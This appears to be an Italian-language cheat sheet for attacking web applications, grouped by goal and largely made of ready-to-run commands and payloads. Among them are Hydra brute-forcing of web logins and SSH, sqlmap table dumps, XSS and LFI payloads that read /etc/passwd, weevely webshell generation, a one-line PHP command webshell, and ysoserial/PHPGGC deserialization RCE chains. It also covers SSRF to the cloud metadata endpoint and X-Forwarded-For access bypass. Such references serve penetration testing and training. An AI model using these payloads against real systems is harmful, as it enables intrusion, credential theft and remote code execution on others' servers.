# 🎨 Web Exploitation Cheatsheet – Poster Edition

🧭 **Mappa mentale veloce** degli strumenti e tecniche di **exploitation web**, divisa per obiettivi.

---

> 🔑 **Bypass Login & Sessioni**
>
> * 🗝️ **Hydra** → brute force su form web, SSH, FTP, SMB, RDP
> * 🧰 **Burp Intruder** → brute force avanzato (CSRF, JSON, cookie)
> * 🔐 **jwt\_tool** → manipolazione/attacchi su JWT (`alg=none`, chiavi deboli)
>
> ```bash
> hydra -l admin -P rockyou.txt <target-ip> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
> hydra -L users.txt -P passwords.txt ssh://<target-ip>
> python3 jwt_tool.py <token> -S hs256 -d wordlist.txt
> ```

---

> 💉 **SQL Injection**
>
> * 🩸 **sqlmap** → enum DB, dump tabelle, RCE via `--os-shell`
> * 🧮 **NoSQLMap** → exploit injection su MongoDB
>
> ```bash
> sqlmap -u "http://<target-ip>/item.php?id=1" --dbs
> sqlmap -u "http://<target-ip>/item.php?id=1" --dump -T users -D appdb
> ```

---

> 🧨 **Cross-Site Scripting (XSS)**
>
> * 🎯 **XSStrike** → scanner XSS avanzato
> * 🧾 **PayloadAllTheThings** → repository payloads
>
> ```bash
> xsstrike -u http://<target-ip>/search.php?q=test
> # Payload base
> <script>alert(1)</script>
> # Polyglot
> "><svg onload=alert(1)>
> ```

---

> 📂 **File Inclusion (LFI/RFI)**
>
> * 🗂️ **LFISuite** → automazione exploitation LFI
> * 🔗 **Wrapper PHP** → `php://filter`, `data://`, `expect://`
>
> ```bash
> python3 lfisuite.py -u "http://<target-ip>/index.php?page=home" -p page
> http://<target-ip>/index.php?page=../../../../etc/passwd
> http://<target-ip>/index.php?page=php://filter/convert.base64-encode/resource=index.php
> ```

---

> 📦 **File Upload Exploitation**
>
> * 🛠️ **Burp Repeater** → manipola estensioni e Content-Type
> * 🐚 **weevely3** → genera webshell PHP obfuscata
>
> ```bash
> weevely generate mysecretpass shell.php
> weevely http://<target-ip>/uploads/shell.php mysecretpass
> ```

---

> 🏗️ **CMS Exploitation**
>
> * 🔍 **WPScan** → utenti, plugin, vulnerabilità WordPress
> * 🐉 **Droopescan** → moduli/temi Drupal
> * 🧾 **Joomscan** → Joomla vuln scanner
>
> ```bash
> wpscan --url http://<target-ip>/ --enumerate u,p --api-token <TOKEN>
> droopescan scan drupal -u http://<target-ip>
> joomscan -u http://<target-ip>
> ```

---

> 🧾 **Deserialization**
>
> * 🪄 **ysoserial** → payload gadget chains (Java)
> * 📦 **PHPGGC** → gadget chain PHP unserialize()
>
> ```bash
> java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.bin
> phpggc Laravel/RCE1 system id | base64
> ```

---

> 🌐 **SSRF (Server-Side Request Forgery)**
>
> * 🌍 **Burp Collaborator** → rileva richieste OOB
> * 🚪 Payloads comuni → 127.0.0.1, AWS metadata
>
> ```bash
> http://127.0.0.1:80/admin
> http://169.254.169.254/latest/meta-data/
> ```

---

> 🖋️ **SSTI (Template Injection)**
>
> * 🧮 **tplmap** → automazione SSTI
> * 🔍 Test rapidi → `{{7*7}}`, `${7*7}`
>
> ```bash
> tplmap -u "http://<target-ip>/index.php?name=FUZZ" -d "name=FUZZ"
> ```

---

> ⚡ **RCE & Command Injection**
>
> * 💥 **Commix** → command injection automation
> * 🐚 **Webshell** → upload PHP/ASP/JS shells
>
> ```bash
> commix --url="http://<target-ip>/vuln.php?cmd=ls"
> <?php system($_GET['cmd']); ?>
> ```

---

> 🧩 **Headers & Caching**
>
> * ✏️ **Header tricks** → `X-Forwarded-For: 127.0.0.1`
> * 🌀 **Cache poisoning** → manipola risposte proxy/cache
>
> ```bash
> curl -H "X-Forwarded-For: 127.0.0.1" http://<target-ip>/admin
> ```

---

# 🧠 Quick Map

* 🔑 **Auth bypass** → Hydra / Burp Intruder / jwt\_tool
* 💉 **SQLi** → sqlmap / NoSQLMap
* 🧨 **XSS** → XSStrike / PayloadAllTheThings
* 📂 **LFI/RFI** → LFISuite / wrappers PHP
* 📦 **Upload** → Burp / weevely3
* 🏗️ **CMS** → WPScan / Droopescan / Joomscan
* 🧾 **Deserialization** → ysoserial / PHPGGC
* 🌐 **SSRF** → Burp Collaborator / cloud metadata
* 🖋️ **SSTI** → tplmap / injection payloads
* ⚡ **RCE/Command Injection** → Commix / Webshell
* 🧩 **Headers & Cache** → X-Forwarded-For / poisoning

---
